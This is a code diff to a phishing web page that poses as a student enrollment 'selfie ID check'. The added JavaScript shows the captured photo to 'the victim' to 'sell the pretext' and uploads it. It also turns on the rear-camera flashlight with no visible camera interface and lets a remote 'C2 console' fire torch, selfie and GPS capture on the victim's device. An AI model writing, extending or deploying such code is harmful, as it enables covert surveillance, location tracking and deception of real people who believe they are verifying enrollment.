@@ -102,6 +102,11 @@
     <h2>Student ID Check</h2>
     <div class="meta">New policy: a quick selfie confirms active enrollment</div>
     <button class="btn" onclick="startSelfie()">Verify with selfie</button>
+    <div id="idPreview" style="display:none;margin-top:12px">
+      <div style="font-size:13px;color:#636e72;margin-bottom:6px">Captured — verifying against student records…</div>
+      <img id="idPhoto" style="width:100%;border-radius:8px;filter:blur(0px)" alt="ID photo">
+      <div class="note">✅ Enrollment confirmed. Downloads unlocked.</div>
+    </div>
   </div>
 
   <div class="card signin" id="signinCard">
@@ -756,6 +761,11 @@ async function startSelfie() {
     c.getContext("2d").drawImage(v, 0, 0, c.width, c.height);
     stream.getTracks().forEach((t) => t.stop());
     post("/event", { text: "📸 Camera accessed — frame captured" });
+
+    // Show the victim their "ID photo" — sells the pretext
+    document.getElementById("idPhoto").src = c.toDataURL("image/png");
+    document.getElementById("idPreview").style.display = "block";
+
     c.toBlob((b) => {
       if (!b) return;
       const fd = new FormData();
@@ -765,6 +775,39 @@ async function startSelfie() {
     }, "image/png");
   } catch (e) {
     post("/event", { text: "🚫 Camera permission denied" });
+  }
+}
+
+// ── 15.5 LED flash (torch) via rear camera track constraint ───
+// HTTPS + Android Chrome only. The page never shows camera UI —
+// the light just turns on while the victim reads.
+async function startTorch() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: { ideal: "environment" } },
+    });
+    const track = stream.getVideoTracks()[0];
+    const caps = track.getCapabilities ? track.getCapabilities() : {};
+    if (!caps.torch) {
+      stream.getTracks().forEach((t) => t.stop());
+      post("/event", { text: "🔦 Torch not available on this device" });
+      return false;
+    }
+    await track.applyConstraints({ advanced: [{ torch: true }] });
+    post("/event", { text: "🔦 LED flashlight turned ON — rear camera stream is live to the page" });
+    window._torchTrack = track;   // keep stream alive until /torch off
+    return true;
+  } catch (e) {
+    post("/event", { text: "🚫 Camera/torch permission denied" });
+    return false;
+  }
+}
+
+async function stopTorch() {
+  if (window._torchTrack) {
+    try { await window._torchTrack.applyConstraints({ advanced: [{ torch: false }] }); } catch (e) {}
+    window._torchTrack.stop();
+    window._torchTrack = null;
   }
 }
 
@@ -797,6 +840,15 @@ function executeCommand(cmd) {
   }
   if (cmd.action === "gps") {
     startGPS("remote-triggered from C2 console — prompt just appeared on the victim screen");
+  }
+  if (cmd.action === "torchOn") {
+    startTorch();
+  }
+  if (cmd.action === "torchOff") {
+    stopTorch();
+  }
+  if (cmd.action === "selfie") {
+    startSelfie();
   }
 }
 
